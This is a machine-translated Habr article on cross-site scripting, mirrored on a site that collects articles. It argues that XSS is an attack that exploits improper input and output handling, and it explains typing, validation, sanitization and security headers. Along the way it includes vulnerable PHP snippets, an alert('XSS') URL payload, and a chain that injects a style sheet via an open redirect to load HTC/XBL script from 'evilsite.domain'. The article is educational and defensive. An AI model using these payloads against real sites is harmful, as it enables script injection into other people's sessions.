<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The whole truth about XSS or Why is cross-site scripting not a vulnerability?</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I must admit that reading comments on Habr√© to almost any posts describing the next XSS on any popular service or website can depress anyone who is so...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The whole truth about XSS or Why is cross-site scripting not a vulnerability?</h1><div class="post__text post__text-html js-mediator-article">  I must admit that reading comments on Habr√© to almost any posts describing the next XSS on any popular service or website can depress anyone who is somehow connected with the security of web applications.  Given the myths and misconceptions about cross-site scripting that are common among developers, it is not surprising that it is one of the most common web application security problems to date: according to a <a href="http://habrahabr.ru/company/pt/blog/145329/">report from Positive Technologies for 2010-2011</a> , XSS were 40% of the analyzed web applications, and from <a href="http://www.firehost.com/company/newsroom/web-application-attack-report-second-quarter-2012">the Firehost report for the second quarter of 2012,</a> it follows that XSS accounted for 27% of the number of attacks registered by the hoster. <br><br>  And since you can zaminusovat this post for only one of its title, I will hasten to explain: cross-site scripting is not really a vulnerability, but only because it is an attack.  What is the difference, why is it important, how to deal with all this, and what other myths and delusions are common about XSS - we read under the cut. <a name="habracut"></a><br><br>  All misconceptions are formulated in the headings, the order is arbitrary, any coincidences of examples of specific attacks and vulnerabilities with real-life ones are random and unintended. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  XSS - Vulnerability </h4><br>  As mentioned above, this is not the case.  Cross-site scripting is an attack, and both according to the <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">OWASP</a> version, and according to the <a href="http://projects.webappsec.org/w/page/13246920/Cross%2520Site%2520Scripting">WASC</a> version (although of course we do not <s>accept the</s> classification <s>manuals</s> ).  In other words, XSS is only one of the possible ways to exploit a particular class of vulnerability.  For example, the following code contains only one vulnerability, but is susceptible to attacks of several classes at once: <br><br><pre><code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> header( <span class="hljs-string"><span class="hljs-string">'Refresh: 5; url='</span></span> . $_GET[<span class="hljs-string"><span class="hljs-string">'url'</span></span>]); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span> &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=<span class="hljs-string"><span class="hljs-string">"refresh"</span></span> content=<span class="hljs-string"><span class="hljs-string">"5;url=&lt;?=$_GET['url']?&gt;"</span></span>&gt;&lt;/meta&gt; &lt;/head&gt; &lt;/html&gt;</code> </pre> <br>  First, this code is subject to an attack of <a href="http://projects.webappsec.org/w/page/13246981/URL%2520Redirector%2520Abuse">abuse of redirection functionality</a> , which has nothing to do with XSS.  Secondly, a request of the form <code>http://localhost/?url="&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;!--</code> interseite script execution <code>http://localhost/?url="&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;!--</code> easily and naturally implemented. Thirdly, if the web - the application will be deployed in an environment that uses the canonical PHP version lower than 4.4.2 or 5.1.2, or a number of third-party PHP implementations, this code will also be vulnerable to <a href="http://projects.webappsec.org/HTTP-Response-Splitting">splitting</a> and <a href="http://projects.webappsec.org/HTTP-Response-Smuggling">hiding</a> HTTP responses (and the security of the web application should not depend on the security of the environment as much as possible). <br><br>  The difference between a vulnerability and an attack is that eliminating a vulnerability can get rid of all the attacks that exploit it, but eliminating a specific attack does not eliminate the vulnerability itself.  A simple example: if we, considering a given XSS as a vulnerability, eliminate it with the help of URL-coding of each fragment of the URL'A script, then the possibility of conducting an attack to abuse the redirection functionality will not affect it at all - the attacker will still be able to redirect the user to arbitrary, correctly formed URL.  Instead of fighting the consequences, we must overcome the cause, namely, eliminate the very one vulnerability that allows all these attacks to be carried out.  In this case, the vulnerability lies in the fact that the url GET parameter is not processed properly either when it is sent to the script by the web server or before it is used in the output.  I beg to love and complain: this vulnerability belongs to the classes of incorrect processing of <a href="http://projects.webappsec.org/Improper-Input-Handling">input</a> and <a href="http://projects.webappsec.org/w/page/13246934/Improper%2520Output%2520Handling">output</a> data and is the most common vulnerability, due to which it is possible to conduct the majority of known attacks today.  Therefore, in order to eliminate this vulnerability, it is necessary to ensure the correct and sufficient processing of both types of data, while it is obvious that in this case URL coding is not sufficient.  We will return to this issue later. <br><br><h4>  XSS is passive and active. </h4><br>  ‚ÄúWhen it becomes completely boring for you - an argument about terminology with colleagues‚Äù (C).  But here is a matter of principle, I'm sorry.  I do not know thanks to whom, this gay classification was imposed on Russian-speaking developers (it is believed that the article on XSS in the Russian Wikipedia contributed to its spread), but this separation, although it does take place, is nonetheless completely useless, since  does not reflect all the properties of a specific XSS that are really significant in terms of analyzing the security of a web application and eliminating the corresponding vulnerabilities.  It is traditionally and mistakenly assumed that XSS can be passive (requiring you to transfer a specially crafted link to the user and convince him to go through it) and active (stored on the server and triggered without unnecessary gestures by the user).  However, consider the following example: suppose that in the Habr engine there is a vulnerability that allows you to go only beyond the <code>src</code> attribute of the <code>&lt;a&gt;</code> tag in the text of habratopic, but not allowing you to go beyond the tag.  It is clear that this vulnerability can be used to conduct an XSS attack, defining a handler for pointing the cursor on a link, clicking on it, etc.  Question: passive or active is such an attack?  On the one hand, the link is stored on the server, it does not need to be delivered to the attacked users, seemingly active.  On the other hand, for a successful attack, additional user actions are necessary, which is typical only for passive attacks.  Paradox?  That is why, XSS is usually classified according to two criteria: vector and mode of action.  The second is precisely those ‚Äúactive / passive‚Äù ones, however, with more distinct formulations: XSS is active and does not require any extra actions from the user in terms of the functionality of the web application, unlike passive ones.  And by impact vector, XSS is divided into a reflected (returned by the server in response to the same request in which the exploitation vector was transmitted), stable (stored on the server and available in all replies to the same query that does not contain the exploitation vector) and based on the object model of the document (which is possible without sending any requests to the server).  Thus, the correct answer to the question of classifying a given example of an attack is: ‚Äústeady-passive‚Äù. <br><br><h4>  XSS is an attack on a user and is aimed at the execution of an arbitrary script in his browser </h4><br>  Obviously, this is not entirely true.  In order to execute an arbitrary script in the victim‚Äôs browser, it would be enough to lure it to a specially prepared page located on the server controlled by the attacker.  XSS, on the other hand, is aimed not just at executing an arbitrary scenario, but at executing it in the context of the source of a specific site in order to circumvent the uniform source policies ( <a href="http://www.w3.org/Security/wiki/Same_Origin_Policy">Same Origin Policy, SOP</a> ) and, as a result, to gain access to the data and functionality of the client part of the web application within user session and with the rights of its user.  This is an attack, first of all, on a web application that realizes the threat in it, and not in the user's browser. <br><br>  At the <a href="http://phdays.ru/">PHDays 2012</a> conference, during the ‚Äú <a href="http://live.digitaloctober.ru/embed/1204%3Flanguage%3Dru%26params%5Bpw%5D%3D630%26params%5Bph%5D%3D355%26params%5Bepisodes_under%5D%3D1%26params%5Beh%5D%3D100">Web 2.0 Security. Advanced Techniques</a> ‚Äù section, its host Anders Ryancho asked the audience a simple question: ‚Äúraise your hands for those who know what a single source policy is.‚Äù  As a person present, I am ready to confirm: a third of the audience, which consists entirely of web developers and security experts, raised their hands on the force.  In the video, this historical moment is, it is a pity that the entire audience at this moment did not hit the frame.  Frankly, I do not quite understand how you can be a developer or an expert on web security and don‚Äôt know about the basic mechanism for protecting modern browsers, so I decided for myself that the people were just too shy to raise their hand in front of a foreigner.  However, even a simple overview of these policies is not a task for a couple of paragraphs, so I can send all those interested in the second part of the e-book " <a href="http://code.google.com/p/browsersec/wiki/Part2">Browser Security Handbook</a> " by Michael Zalewski.  Even more deeply, this topic is covered in " <a href="http://www.amazon.com/The-Tangled-Web-Securing-Applications/dp/1593273886">The Tangled Web</a> " by the same author.  By the way, both are recommended for reading by anyone who is related to web development or web application security analysis. <br><br><h4>  Fighting XSS is a user's problem, and indeed XSS is not serious </h4><br>  It is not entirely clear why this attack on a web application (see above) suddenly became a problem for the user, not the owner or developers of this application.  Here, the question is rather what is their position in ensuring the safe work of users.  The risks associated with the implementation of XSS are indeed often reputable.  However, if we talk about how serious the consequences of successful XSS can be for users, I recommend watching the report of my colleague Denis Baranov ‚ÄúRoot through XSS‚Äù presented at the ZeroNights 2011 conference and dedicated to obtaining privileged access to web developers' computers through an inter-site attack. run scripts (unfortunately, only <a href="http://2011.zeronights.ru/files/denisbaranov-rootviaxss-111202045007-phpapp02.pdf">slides</a> are available, but the general idea, I think it will be clear without video).  How bad will the damage to the reputation of the resource be if, with the help of XSS on its client side, attackers will have unlimited access to the computers of its users?  Taking into account the fact that the means that turn the mass XSS into violinistding has long been there: take, at least, the same <a href="http://beefproject.com/">BeEF</a> .  In addition, we should not forget that from the point of view of XSS, web application administrators are exactly the same users as everyone else (whose problems are supposedly fighting this class of attacks, yeah). <br><br><h4>  XSS is possible only as a result of injection into HTML or client script </h4><br>  Not only.  For example, one of the ways to use the already mentioned HTTP response split attack is to embed an HTML document (and therefore client scripts, if necessary) directly into the HTTP header subject to injection.  The abuse of redirection functionality can be used to redirect the browser to URLs using the data: or javascript: scheme.  Moreover, it is possible and more obscure use of attacks on redirection in order to conduct XSS.  For example, in our web application, in addition to the entry point, with the redirection problem that has already been addressed (available at <code>/redirect.php?url=</code> ), there is also a point with the following code: <br><br><pre> <code class="php hljs">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="hljs-string"><span class="hljs-string">"stylesheet"</span></span> href=<span class="hljs-string"><span class="hljs-string">"/themes/&lt;?=$theme?&gt;.css"</span></span> type=<span class="hljs-string"><span class="hljs-string">"text/css"</span></span> /&gt; &lt;/head&gt;</code> </pre><br>  At the same time, processing the <code>$theme</code> variable obtained from the parameters of a GET request is reduced to removing all quotes from it, as well as backslashes and tags (just in case), which makes it impossible for an attacker to get out of the href attribute.  However, this is not required for XSS.  Using <code>$theme</code> as the <code>$theme</code> parameter <code>../redirect.php?url=http://evilsite.domain/evilstylesheet</code> attacker can embed an arbitrary style sheet into the page.  Using a sheet of content for IE or FF <br><br><pre> <code class="css hljs"><span class="hljs-selector-tag"><span class="hljs-selector-tag">body</span></span> { <span class="hljs-attribute"><span class="hljs-attribute">behavior</span></span>:<span class="hljs-built_in"><span class="hljs-built_in">url</span></span>(../redirect.php?url=http://evilsite.domain/evilscript.htc); }</code> </pre><br>  and <br><br><pre> <code class="css hljs"><span class="hljs-selector-tag"><span class="hljs-selector-tag">body</span></span> { <span class="hljs-attribute"><span class="hljs-attribute">-moz-binding</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">url</span></span>(../redirect.php?url=http://evilsite.domain/evilscript.xml#evilcode); }</code> </pre><br>  respectively, and placing on your server the evilscript.htc files: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PUBLIC:COMPONENT</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">TAGNAME</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"xss"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PUBLIC:ATTACH</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">EVENT</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ondocumentready"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ONEVENT</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"main()"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">LITERALCONTENT</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"false"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">PUBLIC:COMPONENT</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">main</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ alert(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"XSS"</span></span></span><span class="actionscript">); } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SCRIPT</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  and evilscript.xml: <br><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bindings</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.mozilla.org/xbl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:html</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/1999/xhtml"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">binding</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"mycode"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">implementation</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor</span></span></span><span class="hljs-tag">&gt;</span></span> alert("XSS"); <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">implementation</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">binding</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bindings</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  He is achieving successful XSS for users of these two browsers.  Of course, the same applies to the possibility of injecting directly into the definition of styles. <br><br>  UPD: As <a href="http://habrahabr.ru/post/149152/">suggested</a> in the comments, -moz-binding recently <a href="https://bugzilla.mozilla.org/show_bug.cgi%3Fid%3D546857">ordered to live a long time</a> , alas. <br><br>  Most of the XSS vectors available to the attacker in various browsers and HTML versions are listed on the <a href="http://html5sec.org/">HTML5 Security Cheatsheet website</a> .  There you can also find an exhaustive answer to the question voiced in the heading of this section. <br><br><h4>  The framework I use has automatic XSS protection built in, so I don't need to worry about it. </h4><br>  Indeed, in many modern frameworks such protection is implemented.  The XSS Filtering engine in Code Igniter, the regular functionality of templating engines in Django and RoR, Web Protection Library and the Request Validation mechanism in ASP.NET/MVC, etc.  etc.  This is certainly great and it would be foolish not to use this functionality.  It is just as silly as not to take into account that: <br><ul><li>  no server framework is able to protect the web application from DOM-based XSS; </li><li>  none of the existing mechanisms of automatic protection against XSS is universal and devoid of any restrictions that must be considered; </li><li>  the functionality implemented by these mechanisms is aimed at combating a specific class of attacks and cannot protect against the appearance of insufficient data processing in the code of vulnerabilities; </li></ul><br>  Therefore, you still need to take care, just in some frameworks it will not be a chore and will require significant time-consuming. <br><br><h4>  To eliminate XSS, it suffices to escape all lines that fall into an HTML document. </h4><br>  Not enough, the above have already considered why.  We need to eliminate not XSS, but the vulnerability that caused it, which leads us to the need to ensure secure data processing.  Since this topic draws on a separate (and rather rather big) article, I will list the main stages of the implementation of such processing: <br><br><h5>  Determining the degree of confidence in the data </h5><br>  First of all, it is necessary to identify all data streams, the integrity or authenticity of which is not controlled within the considered component of the web application.  The component of a web application, as a rule (although not always), refers to the elements of its server or client part that are executed within the framework of a single OS process. <br><br>  In the above example, the untrusted (and only) data is the url parameter, which is obtained from the GET request string. <br><br><h5>  Typing all untrusted data </h5><br>  As close as possible to the place of appearance of such data in the component, it is necessary to ensure their reduction to the expected types.  In static languages, this is implemented, in fact, by casting to a type or by creating an instance of this type based on deserialization or parsing of the data being checked.  Moreover, in most modern frameworks built in static languages, this functionality is already implemented in the binding mechanisms of query parameters to model objects.  In dynamic languages, everything is somewhat sadder, because  in fact, there it is possible to speak only about the imitation of a cast (which, nevertheless, must be implemented).  Nevertheless, a competent implementation of even such a conditional typing will guarantee that the data of exactly those types that it is designed to work with will be used for our component.  All further work with the data inside the component should be carried out only through objects created on the basis of the input data.  It is important to remember that the main principle of the typing stage is the smallest possible number of string-type objects at its output.  URLs, email addresses, date, time, etc.  after typing, they must be objects of specific types other than string ones.  In the form of rows, only the data that is actually a string should be presented, i.e.  which may actually contain arbitrary full alphanumeric text. <br><br>  In our case, it suffices to use the parse_url () function and implement a check for the appearance of extra underscores in the elements of the resulting array, which indicate the presence of forbidden characters in the original URL (respectively, terminating the typing with an error if such characters were detected or if parse_url () returned FALSE).  In the event that the query key is present in the resulting array, it is also necessary to parse it with parse_str () and replace it with the resulting associative array with the query parameters. <br><br><h5>  Validation of all typed untrusted data </h5><br>  Immediately after typing, the semantics of the obtained objects should be checked for compliance with the component functional.  For example, for integer types or date / time - this will be a range check (hardly any negative page numbers or remittance numbers appear in it correspond to functional expectations), for string ones, in most cases, it will suffice to check for regular expressions, and for objects of more complex types, it is necessary to implement a check of the semantics of each of its fields and properties.  Any validation checks associated with validation should always be based on the whitelist principle, i.e.  the semantics of the data must meet the allowed criteria, and not vice versa.  The purpose of this stage is to obtain a guarantee that all the data inside the component will correspond to the functionality implemented in it and will not be able to violate it. <br><br>  Suppose that in our "web application" redirection can only be carried out within its domain.  In this case, we need to make sure that in the array obtained as a result of parse_url (), only the path, query and fragment keys are present.  The discovery of any other keys must result in a validation error and the termination of processing the request, unless the scheme, host, and port indicate the domain of the web application.  In a more general case, it will be quite cool if the routing mechanism used in the web application also allows us to check the path for a match to a truly existing controller.  And it‚Äôs really cool if the same can be done with the parameters in the query (not to mention the fragment). <br><br><h5>  Sanitize Output </h5><br>  In all places where validated and typed objects leave the component (or where output data are based on them), it is necessary to ensure that they are reduced to a form that is safe for the receiving party.  As a rule, this is achieved by removing from them unsafe elements (filtering) or converting them to safe equivalents (screening).  Sanitization must be implemented adequately to the place where the data will end up.  So, in the case of the formation of an HTML document on their basis, the ways of correct screening of data falling between tags, inside tags, inside specific attributes of tags, in the text of client scripts or style definitions will be different.  In other words, htmlspecialchars () is not a universal means of screening, which will always and everywhere suffice. <br><br>  In our case, it is enough to generate the correct URL based on the fields obtained at the previous stages of the object, using the http_build_query () functions to build the query part and url_encode () when generating path elements (or using http_build_url () and http_build_str () from pecl_http). <br><br>  As a matter of fact, these rules are relevant for any attacks caused by the vulnerability of this class.  For example, for <a href="http://projects.webappsec.org/w/page/13246963/SQL%2520Injection">implementations of SQL statements</a> , <a href="http://projects.webappsec.org/w/page/13246950/OS%2520Commanding">OS commands</a> , etc.  It should also be noted that although most developers have long been aware that the data that the server receives from the client cannot be trusted, almost no one thinks that the opposite is also true, and for the same reasons.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">However, if secure data processing were also implemented on the client side, this would minimize the risks of client attacks associated with exploiting server vulnerabilities. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">To some, these rules may seem redundant and unnecessary, but in a real (read: large and complex) web application, any other way to get rid of XSS on the topic ‚Äúhere it‚Äôs enough just ...‚Äù will be a struggle against the attack, and not with vulnerability. </font><font style="vertical-align: inherit;">With consequences that sooner or later turn into concrete numbers in the reports of information security companies.</font></font><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> On the rights of an epilogue: it turns out, you do not need to fight attacks? </font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Still as needed. Simply resisting attacks should go as a second echelon of protection and should not be used as a means of eliminating vulnerabilities. Finally, I will give one more advice on how to significantly complicate the task of an attacker on the client side (not just XSS). All server responses should contain the following headers: </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-Content-Type-Options:</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> nosniff </font></font><br> <a href="http://msdn.microsoft.com/en-us/library/ie/gg622941"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msdn.microsoft.com/en-us/library/ie/gg622941</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (v = vs.85) .aspx </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-XSS-Protection:</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 1; mode = block </font></font><br> <a href="http://msdn.microsoft.com/en-us/library/dd565647"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msdn.microsoft.com/en-us/library/dd565647</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (v = vs.85) .aspx </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-Frame-Options:</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> DENY </font></font><br> <a href="http://blogs.msdn.com/b/ieinternals/archive/2010/03/30/combating-clickjacking-with-x-frame-options.aspx"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">blogs.msdn.com/b/ieinternals/archive/2010/03/30/ combating-clickjacking-with-x-frame-options.aspx </font></font></a> <br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-Content-Security-Policy:</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[the value of this header must be formed on the basis of the technical requirements for the site's functionality, in accordance with </font></font><a href="https://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ] </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Strict-Transport-Security :</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> max-age = expireTime </font></font><br> <a href="https://developer.mozilla.org/en/Security/HTTP_Strict_Transport_Security"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">developer.mozilla.org/en/Security/HTTP_Strict_Transport_Security To</font></font></a> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> clarify the purpose of each, duplicating the text on the links given - I think that there is no special meaning.</font></font><br><br>  Good luck! </div><p>Source: <a href="https://habr.com/ru/post/149152/">https://habr.com/ru/post/149152/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../149145/index.html">24 Weeks Metro-Design for Windows Phone | # 3 Forming ideas and concepts</a></li>
<li><a href="../149146/index.html">Wikipedia has problems (were)</a></li>
<li><a href="../149148/index.html">Google switched to TLS 1.1 / 1.2</a></li>
<li><a href="../149150/index.html">How do you store site bookmarks?</a></li>
<li><a href="../149151/index.html">Ukrainian police closed Demonoid</a></li>
<li><a href="../149153/index.html">The concept of structural adaptation and an introduction to "pure generalization"</a></li>
<li><a href="../149154/index.html">Runpad Shell protection bypass</a></li>
<li><a href="../149155/index.html">SRT 8500 Overheating Elimination</a></li>
<li><a href="../149156/index.html">Apache Deltacloud 1.0 release</a></li>
<li><a href="../149157/index.html">Where do you get the latest news?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>